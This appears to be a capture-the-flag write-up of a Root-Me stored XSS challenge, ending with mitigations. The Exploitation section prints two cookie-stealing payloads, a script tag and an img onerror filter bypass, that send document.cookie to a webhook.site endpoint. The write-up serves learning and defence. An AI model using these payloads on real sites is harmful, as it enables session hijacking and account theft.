# XSS - Stored (Blind Cookie Theft)

**Date:** March 20, 2026  
**Platform:** Root-Me  
**Difficulty:** Easy  
**Category:** Web / Client-Side  

## 📝 Executive Summary
The objective of this challenge was to exploit a Stored XSS vulnerability in a messaging system to steal an administrator's session cookie. By injecting a "blind" JavaScript payload into the message body, I successfully exfiltrated sensitive data to an external listener when the administrator viewed the post.

## 🔍 Initial Discovery
The application features a message board with "Title" and "Body" fields. Testing revealed that the **Message Body** did not sanitize input, allowing for the storage of arbitrary HTML and JavaScript.

## 🚀 Exploitation

### 1. Weaponization
I crafted a payload to send the `document.cookie` data to an attacker-controlled Webhook.site endpoint.

### 2. Execution (The "Blind" Method)
I chose to use the `Image()` object method. This is stealthier than a `document.location` redirect because it happens in the background without the user noticing a page change.

**Payload:**
```javascript
<script>
  new Image().src='https://webhook.site/YOUR-ID?c=' + document.cookie;
</script>
```

**Alternative (Bypassing simple script filters):**
```html
<img src=x onerror="new Image().src='https://webhook.site/YOUR-ID?c=' + document.cookie">
```

### 3. Capture
1. I submitted the payload in a new message.
2. I monitored the Webhook.site dashboard.
3. Within minutes, the administrator bot visited the page, triggering the background request.
4. The Admin's session cookie appeared in my logs.

## 🛠️ Mitigation & Lessons Learned
1. **Output Encoding:** All stored data must be HTML-encoded before being rendered in the browser to prevent script execution.
2. **HttpOnly Flag:** Set the `HttpOnly` flag on sensitive cookies. This ensures they cannot be accessed via `document.cookie`, neutralizing the impact of XSS.
3. **Content Security Policy (CSP):** Restrict `img-src` or `connect-src` to trusted domains to block exfiltration to unknown servers.
